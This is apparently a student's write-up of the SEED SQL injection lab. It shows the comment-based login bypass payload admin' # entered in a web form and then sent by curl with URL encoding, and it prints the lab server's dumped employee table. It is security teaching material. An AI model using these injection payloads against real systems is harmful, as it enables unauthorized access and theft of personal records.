# SQL Injection Attack Lab

## Task 1: Get Familiar with SQL Statements

To print all the profile information of the employee Alice, we need to select
everything from the table credential, where the column 'Name' is equal to
'Alice'. This can be achieved with the following query:

```sql
SELECT * FROM credential WHERE Name='Alice';
```

![task1_1](task1_1.png)

## Task 2: SQL Injection Attack on SELECT Statement

### Task 2.1: SQL Injection Attack from webpage

To perform this attack, our strategy will be to set the name to admin, and
comment out the rest of the query so that the password never gets checked.
To do this, we enter in the name input field *admin' #*, so the query becomes:

```sql
SELECT id, name, eid, salary, birth, ssn, address, email,
    nickname, Password
FROM credential
WHERE name= 'admin' #' and Password='$hashed_pwd';
```

Which is equivalent to:

```sql
SELECT id, name, eid, salary, birth, ssn, address, email,
    nickname, Password
FROM credential
WHERE name= 'admin';
```

Note: we use *#* instead of the traditional *--* to comment because, according
to the MySQL reference manual, the *--* comment "requires the second dash to be
followed by at least one whitespace or control character". Now lets test this
in the web page.

![task2_1](task2_1.png)

![task2_2](task2_2.png)

### Task 2.2: SQL Injection Attack from command line

Before encoding, the URL of our request should look like this:

```url
http://www.seed-server.com/unsafe_home.php?username=admin'#&Password=
```

For encoding, we just need to replace the *'* character with a %27 and the *#*
with %23. Executing the curl command:

```sh
$ curl http://www.seed-server.com/unsafe_home.php?username=admin%27+%23&Password=´
(...)
<table class='table table-striped table-bordered'><thead class='thead-dark'><tr><th scope='col'>Username</th><th scope='col'>EId</th><th scope='col'>Salary</th><th scope='col'>Birthday</th><th scope='col'>SSN</th><th scope='col'>Nickname</th><th scope='col'>Email</th><th scope='col'>Address</th><th scope='col'>Ph. Number</th></tr></thead><tbody><tr><th scope='row'> Alice</th><td>10000</td><td>20000</td><td>9/20</td><td>10211002</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Boby</th><td>20000</td><td>30000</td><td>4/20</td><td>10213352</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ryan</th><td>30000</td><td>50000</td><td>4/10</td><td>98993524</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Samy</th><td>40000</td><td>90000</td><td>1/11</td><td>32193525</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ted</th><td>50000</td><td>110000</td><td>11/3</td><td>32111111</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Admin</th><td>99999</td><td>400000</td><td>3/5</td><td>43254314</td><td></td><td></td><td></td><td></td></tr></tbody></table>
(...)
```

And we get as a response the HTML code, which contains the table with the
employee information.
